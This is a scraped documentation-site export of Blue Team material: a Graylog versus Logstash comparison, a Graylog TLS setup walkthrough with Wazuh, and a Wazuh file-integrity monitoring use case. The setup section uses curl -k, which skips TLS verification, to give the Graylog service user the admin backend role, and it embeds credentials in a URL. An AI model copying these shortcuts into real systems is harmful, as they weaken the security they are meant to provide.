Logstash typically means editing .conf files to specify, for example, a TCP/UDP listener or file path (input), applying grok patterns or data transformations (filter), and then sending to an output like Elasticsearch. This text-based configuration is very flexible but can be complex for instance, crafting regex patterns for parsing logs can be time-consuming. The ease of use therefore depends on the user’s comfort with configuring systems via code. Many DevOps teams manage Logstash as code (Ansible/Chef scripts, etc.), which is fine for engineers but less accessible to analysts. Additionally, because Logstash is only one part of the Elastic Stack, a full user-facing solution requires setting up Kibana for search and dashboards and Elasticsearch as storage, then ensuring they all connect. This multi-component setup is more involved than Graylog’s unified platform. On the other hand, within an established Elastic Stack environment, adding Logstash can be straightforward, for example, enabling a module or using pre-defined pipeline configs for common sources (Elastic provides modules for ingesting certain logs which automate the Logstash/Elasticsearch index setup). The learning curve for Logstash is moderate to high: it requires understanding pipeline syntax and often some knowledge of Ruby or Grok for advanced parsing. Debugging pipelines can also be tricky (though the Logstash logs and stdout outputs can help). In terms of ongoing use, once logs are indexed into Elasticsearch by Logstash, the ease of searching/analyzing those logs depends on Kibana’s interface. Kibana is a powerful UI, but not as focused on log text search as Graylog’s interface; Kibana may require users to build visualizations or use the Discover tab with Lucene queries. In summary, Logstash demands more initial setup and expertise it is very flexible but not a plug-and-play solution. Teams already invested in Elastic will find it fits naturally, but those seeking a quick, user-friendly log tool might find Graylog’s one-stop interface more convenient.  ","version":"Next","tagName":"h3"},{"title":"1.4 Integration with Other Tools​","type":1,"pageTitle":"Graylog and Logstash Comparative Analysis","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog and Logstash Comparative Analysis#14-integration-with-other-tools","content":" Graylog: Graylog was designed to integrate into diverse environments and often acts as a central hub for logs from many sources. It natively supports a wide array of input integrations: syslog (UDP/TCP), HTTP(S) inputs, its own GELF format (supported by many applications and libraries), and Beats (e.g. Filebeat, Winlogbeat) inputs. Through these inputs, Graylog can ingest logs from network devices, Linux/Windows servers, containers, and more. Graylog relies on Elasticsearch/OpenSearch as its storage backend, so integration with the Elastic ecosystem is built-in, for example, Graylog 5.x added compatibility with OpenSearch 2.x (the engine behind Wazuh’s indexer). This means organizations can use Graylog as the front-end while using OpenSearch/Elasticsearch as the data store, combining Graylog’s ease of use with the scalability of Elastic. For security use cases, Graylog often complements other tools: it can receive alerts from Wazuh (by consuming Wazuh Manager’s JSON alerts via an input) and provide deeper analysis or long-term retention for those alerts. It can also incorporate threat intelligence feeds for instance, Graylog can be extended to query external APIs or databases. A case in point is using Graylog pipelines or lookup tables to enrich logs with data from MISP (Malware Information Sharing Platform) or VirusTotal. Additionally, Graylog has a plugin/marketplace system: there are community and enterprise plugins for integrating with services like Slack (for alert notifications), AWS (CloudWatch logs input), and more. On the output side, Graylog can forward processed log events to other systems if needed using output plugins (e.g. to send alerts to an HTTP endpoint, or to another message queue). However, Graylog is primarily intended to store and search logs internally rather than act purely as a pass-through. In summary, Graylog offers broad integration capabilities: it works seamlessly with Elasticsearch/OpenSearch, can ingest logs from virtually any source (with or without the help of agents like Beats/Fluent Bit), and can enhance a security stack by integrating with SIEM tools (like feeding data to Splunk or receiving from OSSEC/Wazuh) as well as threat intel platforms.  Image 1.1 – Graylog Integration Ecosystem  Logstash: Integration is the hallmark of Logstash it is essentially an integration pipeline by design. Logstash has an extensive plugin ecosystem maintained by Elastic and the community, which enables it to connect to numerous data sources and destinations. For inputs, Logstash can listen for syslog, read files, poll message queues (Kafka, RabbitMQ, AWS SQS), connect to databases, receive events over UDP/TCP, and even pull from APIs (e.g. via HTTP polling). This means Logstash can sit at the center of an organization's data flow, aggregating not just logs but also metrics or application events. In security contexts, Logstash has been used to feed data from IDS systems, firewalls, and endpoint agents into Elasticsearch for correlation. For example, in the Elastic Security stack, beats like Filebeat collect data on endpoints and network, but Logstash can be inserted for additional processing or when data comes from custom sources. Wazuh, which is built on Elastic Stack, initially used Logstash to parse its alerts and send them to Elasticsearch, demonstrating Logstash’s role in integrating SIEM components. While Wazuh replaced Logstash with Filebeat for efficiency, Logstash can still integrate Wazuh by parsing alert JSON or Syslog feeds if one chooses a custom setup. Regarding threat intelligence, Logstash doesn’t have out-of-the-box MISP integration, but creative use of its filters (or an http input plugin) can allow it to periodically ingest threat intel (for instance, pulling IoC lists and then using the translate filter to tag events that match). For outputs, Logstash is very flexible: while Elasticsearch is the most common output, it can also output to files, email, HTTP endpoints, Kafka, other databases, or even back to a syslog server. This allows Logstash to act as a router between systems (e.g. receive logs and simultaneously index them in ES and send a copy to a data lake or to Graylog via GELF if one wanted). Integration with visualization tools is indirect: Logstash feeds data to stores that tools like Kibana or Grafana will then visualize. One key integration advantage of Logstash is that it’s part of the Elastic Stack, so it works in concert with Elasticsearch, Kibana, APM, and Beats with official support. In cloud environments, Logstash is often integrated with container orchestration (there are Helm charts, Docker images) and with managed services (e.g. Elastic Cloud or Amazon OpenSearch Service support ingest pipelines). In summary, Logstash provides deep integration hooks into various systems through its plugins, it can be seen as the “glue” that connects log sources to analysis tools. This flexibility, however, comes with the requirement to configure those integrations manually. Graylog covers many integrations out-of-the-box in a simpler way, but Logstash will typically offer a broader range of connectors (especially for less common systems or custom workflows).  Image 1.2 - Logstash Pipeline Architecture.  ","version":"Next","tagName":"h3"},{"title":"1.5 Cost Considerations (Open-Source vs. Enterprise Features)​","type":1,"pageTitle":"Graylog and Logstash Comparative Analysis","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog and Logstash Comparative Analysis#15-cost-considerations-open-source-vs-enterprise-features","content":" Graylog: Graylog is open-source (licensed under GPL v3), and the core Graylog server is free to use. The open-source edition provides all the fundamental capabilities needed for log management: data ingestion, processing pipelines, search, dashboards, and basic alerting. Graylog the company offers commercial editions (often termed Graylog Enterprise or in newer branding, Graylog Operations and Graylog Security). These enterprise versions build on the open core and add features geared towards larger deployments and advanced security analytics. Examples of enterprise features include long-term archiving of logs (offloading old indices to cheaper storage), enhanced search workflows (like search templates or extended retention of search results), audit logs of user activity, and certain content packs or integrations (for instance, some threat intelligence lookup integrations might be part of a licensed feature set). Graylog’s enterprise license historically has been free for small environments (e.g. a certain amount of data per day or a limited number of Graylog nodes) and requires a paid subscription for larger scales or official support. For cost, if an organization’s needs are met by the open-source Graylog, then the only costs are infrastructure (servers for Graylog, Elasticsearch, MongoDB) and maintenance. This can make Graylog an attractive low-cost alternative to commercial SIEM products like Splunk. If enterprise features or support are needed, then one must factor in Graylog’s licensing costs, which are typically priced by the amount of data or the number of server nodes. It’s also worth noting that running Graylog at scale might involve employing multiple servers and a robust Elasticsearch cluster, which incurs hardware/cloud costs but this is comparable to running any log solution at scale. In academic and real-world case studies, Graylog often stands out as cost-efficient: it delivers a lot of SIEM-like functionality without hefty license fees (when using the open version). Organizations with limited budgets often choose Graylog for this reason. In summary, Graylog’s open-source version provides substantial value at no licensing cost, while the enterprise tier introduces additional features and official support for a subscription, which one would consider if those features justified the expense in a production environment.  Logstash: Logstash is completely open-source (now under Elastic’s dual license policy, but essentially free to use). There is no “enterprise Logstash” all features of Logstash are available in the free distribution. This means the software cost for using Logstash is zero, like Graylog’s OSS offering. However, Logstash is usually used as part of the Elastic Stack, and cost considerations typically revolve around Elastic’s licensing. Elasticsearch and Kibana (which accompany Logstash) have a free basic tier and then paid tiers for features like machine learning, advanced security, and support. Since 2018+, Elastic has made many former commercial features available in the free basic license (e.g. security features like TLS and RBAC in Elasticsearch are now free). So, one can run a full ELK (Elasticsearch-Logstash-Kibana) stack at no cost for the software. The cost factors come in when deciding on support or proprietary features: for example, an enterprise might pay for an Elastic X-Pack subscription or use Elastic Cloud for hosting, which are paid services. Alternatively, using the fully open-source OpenSearch (fork of Elasticsearch) with Logstash is an option to avoid any licensing concerns, as OpenSearch is Apache 2.0 licensed. In terms of resource cost, Logstash might require more compute resources for heavy processing compared to Graylog’s pipeline (which could be considered a cost in terms of infrastructure). But both systems at scale will need comparable investments in storage and computing. Another angle is development/maintenance cost: Logstash could incur higher labor cost to configure and maintain pipelines for complex use cases, whereas Graylog might reduce that with its UI-driven approach. If we compare with Graylog’s enterprise features, to get equivalent functionality with an Elastic Stack, one might integrate additional open tools (for example, use Curator for index archiving, or custom scripts for auditing) which is effort, or purchase an Elastic Stack license that includes those conveniences. Community support for Logstash is free (forums, etc.), and Elastic offers paid support contracts if needed. In summary, using Logstash itself does not require any licensing fees it is a cost-effective component. The main cost considerations are indirect: the need for complementary tools (Elasticsearch, Kibana) and the potential subscription if opting for Elastic’s official support or cloud services. Organizations already paying for an Elastic Stack license effectively get Logstash included. Those on a budget can run the entire Elastic Stack free, making Logstash an equally budget-friendly choice as Graylog OSS, with the trade-off being the additional engineering effort to assemble the pieces.  ","version":"Next","tagName":"h3"},{"title":"1.6 Community Support and Documentation​","type":1,"pageTitle":"Graylog and Logstash Comparative Analysis","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog and Logstash Comparative Analysis#16-community-support-and-documentation","content":" Graylog: As an open-source project, Graylog has an active but comparatively smaller community than the Elastic Stack. Graylog’s community forums and Slack channels host discussions where users share configurations, problem solutions, and plugins. The official Graylog documentation is well-structured, covering installation, configuration, and usage of features (inputs, streams, pipeline rules, etc.). Many users report that Graylog’s docs are straightforward and focused, which helps in getting the system running and solving common tasks. Graylog, Inc. also provides webinars, and blogs that share use cases (for example, using Graylog for specific compliance scenarios or threat hunting). There is a Graylog Marketplace where community members contribute content packs and plugins to extend Graylog’s functionality or support new data sources, reflecting a dedicated user base. However, in sheer numbers, Graylog’s community is smaller than Elastic’s: fewer third-party tutorials and books exist, and niche issues might have less coverage. On the plus side, Graylog’s community tends to be focused on log management use cases, so one can find guidance specific to things like “centralizing Windows Event logs in Graylog” or “Graylog for AWS cloud logs” relatively easily. The Graylog team is also active in the community, often responding to questions. In academic circles, Graylog is recognized for its role in SIEM implementations, and one can find case studies or conference papers detailing Graylog deployments for security monitoring. Overall, Graylog enjoys a supportive community and clear documentation, but users may occasionally have to rely on their own experimentation or direct community help for very advanced integrations or performance tuning, given the smaller pool of expertise compared to Logstash.  Logstash: Logstash benefits from being part of one of the largest open-source communities in the logging and search domain. the Elastic Stack community. This means there is a wealth of knowledge available: extensive official documentation and innumerable blog posts, how-to articles, and forum Q&amp;As. The official Elastic documentation for Logstash is comprehensive, detailing every plugin with configuration examples, which is extremely helpful when setting up complex pipelines. There are also books and online courses that cover ELK stack administration, including Logstash. On forums like Stack Overflow or the Elastic Discuss forum, questions about Logstash configuration, performance tuning, and troubleshooting are frequently asked and answered, so solutions to common issues are easy to find. The community has also created many custom plugins and filters (though since Elastic’s licensing change, third-party development might be more focused on OpenSearch’s pipeline tool or older versions of Logstash). Because Logstash has been widely adopted in industries for years, its user community spans from hobbyists to large enterprise operations, contributing to a rich knowledge base. One challenge with this breadth is that beginners might find a lot of information (sometimes outdated) to sift through e.g. multiple ways to do something or deprecated plugin advice so the learning community can be a bit overwhelming. Elastic’s backing also means there are professional support options and consulting available for Logstash if needed. In academia and industry research, the ELK stack (including Logstash) is frequently referenced as a go-to solution for big data logging and even for cybersecurity data analytics, so knowledge of Logstash is widespread. In summary, Logstash’s community support and documentation are excellent and abundant. The Elastic Stack ecosystem has a maturity and volume of resources that arguably surpasses Graylog’s, simply due to its larger user base. This makes it likely that any given question or requirement for Logstash has been encountered by someone and answered in public forums.  ","version":"Next","tagName":"h3"},{"title":"1.7 Conclusion and Recommendations​","type":1,"pageTitle":"Graylog and Logstash Comparative Analysis","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog and Logstash Comparative Analysis#17-conclusion-and-recommendations","content":" Both Graylog and Logstash are powerful tools for log processing and analytics, but they cater to slightly different needs and user preferences. To summarize the comparative strengths and weaknesses:  Graylog – Strengths: User-friendly and quick to deploy for centralized log management (comes with a rich web UI, dashboards, and alerting out-of-the-box), great for security log analysis with built-in correlation and enrichment capabilities (e.g. integrating threat intelligence feeds), and no additional visualization software needed since search and charts are built in. It ensures reliability through features like the disk journal for buffering. The open-source version is feature-rich and can dramatically cut costs compared to commercial SIEM solutions. Graylog’s focused community and documentation make it relatively easy to get started and solve common log management tasks.  Graylog – Weaknesses: It relies on Elasticsearch/OpenSearch, so effectively one has to manage those systems as well (upgrading and scaling Elasticsearch can be non-trivial). Its performance is tied to the backend database, and very large-scale deployments might require significant Elasticsearch clusters, similar to ELK in complexity. Truly advanced log pipeline customizations are somewhat less flexible than Logstash’s plugin model, you are constrained by what Graylog’s pipeline rules and plugins can do (though they cover most needs). Some enterprise-level features (like archival, multi-site replication, or advanced correlation rules) require the paid Graylog Enterprise license. Lastly, the ecosystem around Graylog is smaller; for extremely custom requirements, there might be fewer third-party solutions readily available than exist for Logstash.  Logstash – Strengths: Highly flexible and extensible pipeline engine, it can integrate with nearly any data source or destination due to its rich plugin library, making it suitable for complex or custom logging requirements in DevOps pipelines and data engineering contexts. It excels in scenarios where heavy log transformation or enrichment is needed before indexing. Part of the Elastic Stack, it naturally integrates with Elasticsearch and Kibana (and benefits from their continued development and large user base). Performance can scale by adding multiple instances/workers and using message queues, fitting into distributed architectures. Completely free with no separate enterprise version, so all features are available without license fees. Backed by extensive community and documentation, which lowers the risk when troubleshooting or extending the tool.  Logstash – Weaknesses: Steeper learning curve and more setup effort, requires managing configuration files and additional components (Elasticsearch, Kibana) to have a full logging solution. Can be resource-intensive, which might necessitate using alternative shippers (like Beats or Fluent Bit) for simple tasks to avoid deploying too many Logstash instances. No native GUI or user management; non-technical users must rely on Kibana or other interfaces for interacting with the data. Changes in Elastic’s licensing (moving away from pure Apache 2.0) have led some to adopt OpenSearch or other tools, meaning the future community may split (though at present Logstash remains widely used). In short, Logstash might be “overkill” for smaller projects that don’t need its full power, whereas those projects could thrive with the simplicity of Graylog.  1.8 Making a Decision: For organizations that want a quick, all-in-one log management solution with minimal configuration, especially for security monitoring or general IT log centralization. Graylog is often the recommended choice. It provides faster time-to-value and an easier user experience for analysts and engineers to start investigating logs immediately. Graylog shines in environments where integrated dashboards and alerting on logs are needed without assembling a full Elastic Stack. On the other hand, organizations that already use Elasticsearch extensively, or that require highly customized data pipelines and maximum integration flexibility, might favor Logstash. In a large-scale, heterogeneous data environment (for example, aggregating logs, metrics, and events into a data lake), Logstash’s adaptability is a major asset. Also, if a team already has Kibana for other analytics, adding Logstash can leverage existing expertise.  In practice, these tools are not mutually exclusive, some deployments use Logstash (or Beats) to feed data into Graylog, and conversely Graylog can export data to Elastic stacks. Each tool can be the right choice depending on context.  Graylog offers a more opinionated, streamlined experience ideal for many logging use cases, whereas Logstash offers a building-block for those who need a tailored logging pipeline. Evaluators should consider the scale of logs, the available skill set of the team, and specific feature requirements (e.g. built-in UI vs. custom pipeline needs) when selecting between Graylog and Logstash. Both are capable of delivering real-time insights from log data, and both are supported by vibrant communities ensuring that either choice will be backed by continuous improvements and peer support in the foreseeable future. The decision ultimately hinges on whether the preference is for a ready-to-use platform (Graylog) or a flexible framework to integrate logs into an existing ecosystem (Logstash).  ","version":"Next","tagName":"h3"},{"title":"References​","type":1,"pageTitle":"Graylog and Logstash Comparative Analysis","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog and Logstash Comparative Analysis#references","content":" Elastic. (2023). Logstash Documentation. Elastic. Retrieved from https://www.elastic.co/logstashGraylog. (2023). Graylog Documentation. Retrieved https://go2docs.graylog.org/Faruk Ozelll. (2024). Log Management: Graylog vs ELK — Which One is Right for You? Medium. Retrieved from https://medium.com/@faruk.ozelll/log-management-graylog-vs-elk-which-one-is-right-for-you-a6d42c924218 ","version":"Next","tagName":"h3"},{"title":"Graylog Setup and TLS Integration Report","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog setup with TLS","content":"","keywords":"","version":"Next"},{"title":"Background​","type":1,"pageTitle":"Graylog Setup and TLS Integration Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog setup with TLS#background","content":" Graylog is a centralized log management and analysis platform designed to help IT and security teams collect, normalize, and analyze large volumes of log data from distributed systems. With the increasing complexity of IT infrastructures and growing cybersecurity threats, centralized logging is essential for detecting anomalies, auditing system activity, and investigating security incidents in real-time.    As part of our security operations, implementing Graylog complements the Wazuh SIEM platform. While Wazuh provides endpoint monitoring and alerting, Graylog enhances visibility through intuitive dashboards, advanced search capabilities, and structured log correlation. This integration also provides a foundation for correlating log activity with threat intelligence from MISP (Malware Information Sharing Platform).    ","version":"Next","tagName":"h2"},{"title":"Purpose of This Report​","type":1,"pageTitle":"Graylog Setup and TLS Integration Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog setup with TLS#purpose-of-this-report","content":" This report provides a comprehensive walkthrough of the setup and TLS configuration process for Graylog. It focuses on establishing secure communications between Graylog and the Wazuh Indexer using trusted certificates. The goal is to ensure encrypted data exchange and validate that Graylog can securely ingest and query data from OpenSearch (used by Wazuh).    ","version":"Next","tagName":"h3"},{"title":"1. Graylog Installation Summary​","type":1,"pageTitle":"Graylog Setup and TLS Integration Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog setup with TLS#1-graylog-installation-summary","content":" ","version":"Next","tagName":"h3"},{"title":"1.1 OS and Dependencies​","type":1,"pageTitle":"Graylog Setup and TLS Integration Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog setup with TLS#11-os-and-dependencies","content":" Operating System: Ubuntu Server 22.04Java Runtime: OpenJDK 17 is required for Graylog's backend engine.Node name: capstone.node-1  sudo apt install openjdk-17-jre-headless   ","version":"Next","tagName":"h3"},{"title":"1.2 MongoDB Setup​","type":1,"pageTitle":"Graylog Setup and TLS Integration Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog setup with TLS#12-mongodb-setup","content":" Purpose: Stores Graylog metadata such as users, roles, and configuration settings.Version Installed: MongoDB 6.0After resolving held packages and source priority issues, MongoDB was successfully installed and confirmed to be running.  Screenshot showing mongoDB active and running  ","version":"Next","tagName":"h3"},{"title":"1.3 Graylog Server Installation​","type":1,"pageTitle":"Graylog Setup and TLS Integration Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog setup with TLS#13-graylog-server-installation","content":" Added the Graylog 5.1 repository and installed the package:  wget https://packages.graylog2.org/repo/packages/graylog-5.1-repository_latest.deb sudo dpkg -i graylog-5.1-repository_latest.deb sudo apt update &amp;&amp; sudo apt install graylog-server sudo systemctl start mongod   ","version":"Next","tagName":"h3"},{"title":"1.4 Graylog Web Interface Setup​","type":1,"pageTitle":"Graylog Setup and TLS Integration Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog setup with TLS#14-graylog-web-interface-setup","content":" Default web interface available at http://&lt;server-ip&gt;:9000Configured initial admin user and accessed the dashboard for operational verification.    ","version":"Next","tagName":"h3"},{"title":"2. TLS Truststore Integration (Graylog ↔ Wazuh Indexer)​","type":1,"pageTitle":"Graylog Setup and TLS Integration Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog setup with TLS#2-tls-truststore-integration-graylog--wazuh-indexer","content":" ","version":"Next","tagName":"h3"},{"title":"2.1 Problem Statement​","type":1,"pageTitle":"Graylog Setup and TLS Integration Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog setup with TLS#21-problem-statement","content":" When attempting to connect Graylog with Wazuh’s OpenSearch-based indexer using HTTPS, the following error was encountered:  PKIX path validation failed: Path does not chain with any of the trust anchors.   This indicated that Graylog’s JVM did not trust the certificate served by the Wazuh Indexer.  ","version":"Next","tagName":"h3"},{"title":"2.2 Solution Overview​","type":1,"pageTitle":"Graylog Setup and TLS Integration Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog setup with TLS#22-solution-overview","content":" Created a custom truststore specifically for Graylog.Imported Wazuh's internal root CA into the truststore using keytool.Updated Graylog’s JVM options to reference the custom truststore.  ","version":"Next","tagName":"h3"},{"title":"2.3 Certificate Preparation​","type":1,"pageTitle":"Graylog Setup and TLS Integration Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog setup with TLS#23-certificate-preparation","content":" Files used:  /etc/wazuh-indexer/certs/indexer.pem /etc/wazuh-indexer/certs/root-ca.pem   Command to generate full certificate chain:  cat indexer.pem root-ca.pem &gt; fullchain.pem   Screenshot of certificate chain validation using OpenSSL  To validate the certificate chain using OpenSSL, the following command was used:  openssl s_client -connect capstone.node-1:9200 -CAfile /etc/wazuh-indexer/certs/root-ca.pem   ","version":"Next","tagName":"h3"},{"title":"2.4 Truststore Import​","type":1,"pageTitle":"Graylog Setup and TLS Integration Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog setup with TLS#24-truststore-import","content":" cp -a /usr/lib/jvm/java-17-openjdk-amd64/lib/security/cacerts /etc/graylog/server/certs/cacerts keytool -importcert -keystore /etc/graylog/server/certs/cacerts -storepass &lt;password&gt; -alias root_ca -file /etc/wazuh-indexer/certs/root-ca.pem   ","version":"Next","tagName":"h3"},{"title":"2.5 Graylog Configuration/JVM Truststore Activation​","type":1,"pageTitle":"Graylog Setup and TLS Integration Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog setup with TLS#25-graylog-configurationjvm-truststore-activation","content":" Edited the configuration file located at /etc/graylog/server/server.conf by generating and adding the password secret and root password using the following commands:  Password secret generation:  pwgen -N 1 -s 96   Root password generation:  echo -n &quot;Enter Password: &quot; &amp;&amp; head -1 &lt;/dev/stdin | tr -d '\\n' | sha256sum | cut -d&quot; &quot; -f1   Created the internal User on Wazuh, assigning it a chosen backend role using the following command:  curl -k -u '&lt;username:&lt;password&gt;' \\ -XPUT &quot;https://192.168.56.109:9200/_plugins/_security/api/internalusers/$GRAYLOG_USER&quot; \\ -H &quot;Content-Type: application/json&quot; \\ -d '{ &quot;password&quot;: &quot;&lt;password&gt;&quot;, &quot;backend_roles&quot;: [&quot;admin&quot;], &quot;attributes&quot;: {} }'   Added the following options in /etc/default/graylog-server:  -Djavax.net.ssl.trustStore=/etc/graylog/server/certs/cacerts -Djavax.net.ssl.trustStorePassword=&lt;password&gt;   Screenshot of JVM Truststore Import Success  ","version":"Next","tagName":"h3"},{"title":"2.6 Trust Validation​","type":1,"pageTitle":"Graylog Setup and TLS Integration Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog setup with TLS#26-trust-validation","content":" Used curl to validate the chain and confirm a successful TLS handshake:  curl -vk https://capstone.node-1:9200   Output: The verify return code was 0 (ok).  ","version":"Next","tagName":"h3"},{"title":"3.0 Graylog Configuration Review​","type":1,"pageTitle":"Graylog Setup and TLS Integration Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog setup with TLS#30-graylog-configuration-review","content":" Updated /etc/graylog/server/server.conf:  elasticsearch_hosts = https://&lt;userame&gt;:&lt;password&gt;@capstone.node-1:9200 elasticsearch_tls_verify = true transport_tls_trust_store_path = /etc/graylog/server/certs/cacerts transport_tls_trust_store_password = &lt;password&gt;   ","version":"Next","tagName":"h3"},{"title":"3.1 Secure Alternative Format​","type":1,"pageTitle":"Graylog Setup and TLS Integration Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog setup with TLS#31-secure-alternative-format","content":" Instead of embedding credentials in the URL, use the secure format:  elasticsearch_hosts = https://capstone.node-1:9200 elasticsearch_username = &lt;username&gt; elasticsearch_password = &lt;password&gt;     ","version":"Next","tagName":"h3"},{"title":"4. Final Verification​","type":1,"pageTitle":"Graylog Setup and TLS Integration Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog setup with TLS#4-final-verification","content":" Graylog successfully connected to Wazuh Indexer over HTTPS.TLS certificate chain was validated.Logs showed successful authentication and data ingestion.No further errors were present in /var/log/graylog-server/server.log.  Screenshot of Graylog Indexer Connection Success  Appendix​  Tools Used: OpenSSL, keytool, curl, systemctlLog and Config Files Modified: /etc/graylog/server/server.conf/etc/default/graylog-server/etc/graylog/server/certs/cacerts  ","version":"Next","tagName":"h3"},{"title":"Video Tutorial​","type":1,"pageTitle":"Graylog Setup and TLS Integration Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog setup with TLS#video-tutorial","content":"  ","version":"Next","tagName":"h2"},{"title":"Screenshot of Wazuh","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/cases","content":"Last updated by: bg-11, Last updated on: '16/05/2025' Last updated by: bg-11, Last updated on: '16/05/2025' important By Prabhgun Singh. 16/09/2024 Screenshot of Wazuh Use Case: Endpoint Integrity Monitoring for Critical System Files Overview Monitoring and defending endpoints—such as workstations, servers, and mobile devices—against potential threats is the responsibility of endpoint security. System configuration files are one frequent way that attackers utilize to gain persistence or escalate privileges. It's essential to keep an eye on the integrity of these files to spot changes and stop possible security breaches. Solution In this use case, Wazuh’s Syscheck module is configured to monitor critical system files (e.g., /etc/passwd, /etc/shadow, /etc/group). It regularly compares the files' checksums to detect changes. Alerts are generated whenever a file is modified, allowing security teams to investigate whether the changes were authorized or if they could be part of a malicious activity. Steps File Integrity Monitoring (FIM): The system continuously monitors key files and directories for any changes in content, ownership,or permissions. Examples include /etc/passwd, /etc/shadow, and other sensitive configuration files. Alerting Mechanism: Upon detecting a change, Wazuh notifies the user and designates a level of severity according to the rule that was triggered (in this example, Rule ID 550 for &quot;Integrity checksum changed&quot;). The agent name, timestamp, file location, and event type (such as modification) are also recorded by the system. Security Response: These notifications are received in real-time by security operations teams, enabling them to promptly look into the source of the changes. The group will ascertain if the modifications were the consequence of malicious activity (such as an attacker trying to escalate privileges) or lawful actions (such as system updates and configuration changes). The incident response team can move quickly to detect unauthorized alterations by rolling back changes, isolating the impacted endpoint, and launching a more thorough forensic investigation. Benefits Proactive Threat Detection: Recognizing and reacting to modifications in important documents aids in the early detection of any breaches before they get worse. Reduced Attack Surface: Stop hackers from altering files that manage system settings or user permissions without authorization. Enhanced Visibility: The vital components of the endpoint are continuously under observation thanks to real-time monitoring. Potential Risks False Positives: Alert fatigue may result from notifications legitimately triggered by system procedures or updates not adjusted effectively. Performance Impact: If continuous monitoring is not set up effectively, it can marginally reduce performance on high-traffic endpoints. Conclusion Utilizing Wazuh's endpoint monitoring features, businesses may obtain vital information about the security stance of their endpoints. This lets businesses identify illegal changes to system files quickly and take corrective action to stop security breaches, which eventually increases the overall effectiveness of their security operations.","keywords":"","version":"Next"},{"title":"Choosing Both Suricata and Wazuh: Understanding Their Unique Qualities","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/Choosing-Both-Suricata-and-Wazuh","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Choosing Both Suricata and Wazuh: Understanding Their Unique Qualities","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/Choosing-Both-Suricata-and-Wazuh#introduction","content":" Redback Operations focuses on developing cutting-edge connected fitness devices. It requires the paramount importance of protecting user data and ensuring the integrity of the products. To enhance the security of the software systems within Redback Operations. We have implemented both Wazuh and Suricata on our virtual machine (VM) which will handle all the software project and data. This initiative is proactive approach to cybersecurity which aims to mitigate risks, ensure compliance, and enhance the safety, reliability, and peace of mind associated with our connected fitness technology. This document provides an overview of the need for implementing both Wazuh and Suricata, the strategic reasons behind their deployment, and the benefits they offer in terms of security, compliance, scalability, and operational efficiency.  ","version":"Next","tagName":"h2"},{"title":"Why We Implemented Both Wazuh and Suricata?​","type":1,"pageTitle":"Choosing Both Suricata and Wazuh: Understanding Their Unique Qualities","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/Choosing-Both-Suricata-and-Wazuh#why-we-implemented-both-wazuh-and-suricata","content":" ","version":"Next","tagName":"h2"},{"title":"1. Enhanced Security Posture​","type":1,"pageTitle":"Choosing Both Suricata and Wazuh: Understanding Their Unique Qualities","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/Choosing-Both-Suricata-and-Wazuh#1-enhanced-security-posture","content":" Wazuh is a Security Information and Event Management (SIEM) solution which focuses on collecting and analysing logs and events from hosts, applications, and network devices for security monitoring and threat detection [1]. Whereas Suricata is a Network Intrusion Detection System (NIDS) that focuses on inspecting network traffic and packets to detect threats like intrusions, DDoS attacks, and suspicious network activities. By combining these two solutions, we can achieve comprehensive security coverage, by combining both solutions.  ","version":"Next","tagName":"h3"},{"title":"2. Scalability and Flexibility​","type":1,"pageTitle":"Choosing Both Suricata and Wazuh: Understanding Their Unique Qualities","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/Choosing-Both-Suricata-and-Wazuh#2-scalability-and-flexibility","content":" Both Wazuh and Suricata are designed to scale with our growing infrastructure. Wazuh can handle log and event monitoring across multiple endpoints, while Suricata efficiently processes high-speed network traffic. This ensures that our security measures remain effective as our operations expand, without the need for frequent upgrades or replacements.  ","version":"Next","tagName":"h3"},{"title":"3. Improved Operational Efficiency​","type":1,"pageTitle":"Choosing Both Suricata and Wazuh: Understanding Their Unique Qualities","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/Choosing-Both-Suricata-and-Wazuh#3-improved-operational-efficiency","content":" Centralizing security monitoring with Wazuh and leveraging Suricata's network detection capabilities streamlines our security operations. This reduces the workload on security teams and project handlers, enabling efficient threat detection and response.  ","version":"Next","tagName":"h3"},{"title":"4. Comprehensive Security Monitoring​","type":1,"pageTitle":"Choosing Both Suricata and Wazuh: Understanding Their Unique Qualities","url":"/redback-documentation/docs/cybersecurity/Blue 